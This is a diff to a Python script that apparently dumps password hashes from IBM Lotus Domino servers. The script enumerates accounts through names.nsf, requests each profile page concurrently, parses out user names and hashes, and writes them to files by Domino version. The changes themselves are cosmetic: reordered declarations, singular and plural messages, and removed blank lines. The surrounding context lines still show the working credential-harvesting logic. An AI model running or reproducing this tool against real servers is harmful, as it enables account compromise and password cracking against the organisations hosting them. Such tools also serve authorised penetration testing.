@@ -28,10 +28,11 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Get user profile URLs
 def enum_accounts(target, header, username, password):
-	accounts = []
-	account_urls = []
 	session = requests.Session()
 	session.auth = (username, password)
+
+	accounts = []
+	account_urls = []
 
 	for page in range(1, 100000, 1000):
 		try:
@@ -60,13 +61,16 @@ def enum_accounts(target, header, username, password):
 			else:
 				utility.print_warn('Could not connect to Domino server!')
 				break
-
 		except Exception as error:
 			utility.print_error("Error: {0}".format(error))
 			break
 
 	if len(accounts) > 0:
-		utility.print_good("Found {0} accounts, dumping hashes".format(len(accounts)))
+		if len(accounts) == 1:
+			utility.print_good("Found {0} account, dumping hash".format(len(accounts)))
+		elif len(accounts) > 1:
+			utility.print_good("Found {0} accounts, dumping hashes".format(len(accounts)))
+
 		for unid in accounts:
 			account_urls.append("{0}/names.nsf/{1}?OpenDocument".format(target, unid))
 
@@ -83,14 +87,12 @@ def async_requests(accounts, header, username, password):
 		for account_url in requests.swarm(accounts, maintainOrder=False):	
 			if account_url.status_code == 200:
 				get_domino_hash(account_url)
-
 	except KeyboardInterrupt:
 		requests.stop(killExecuting=True)
 
 # Dump Domino hashes
 def get_domino_hash(response):
 	soup = BeautifulSoup(response.text, 'lxml')
-
 	try:
 		# Get account username
 		username_params = ['$dspFullName', '$dspShortName']
@@ -109,7 +111,6 @@ def get_domino_hash(response):
 				break
 			else:
 				continue
-
 	except:
 		pass
 
@@ -123,11 +124,9 @@ def write_hash(duser, dhash):
 	if len(dhash) == 34:
 		dhash = dhash.strip('()')
 		outfile = 'Domino_5_hashes.txt'
-
 	# Domino 6 hash format: (GDpOtD35gGlyDksQRxEU)
 	elif len(dhash) == 22:
 		outfile = 'Domino_6_hashes.txt'
-
 	# Domino 8 hash format: (HsjFebq0Kh9kH7aAZYc7kY30mC30mC3KmC30mCluagXrvWKj1)
 	else:
 		outfile = 'Domino_8_hashes.txt'
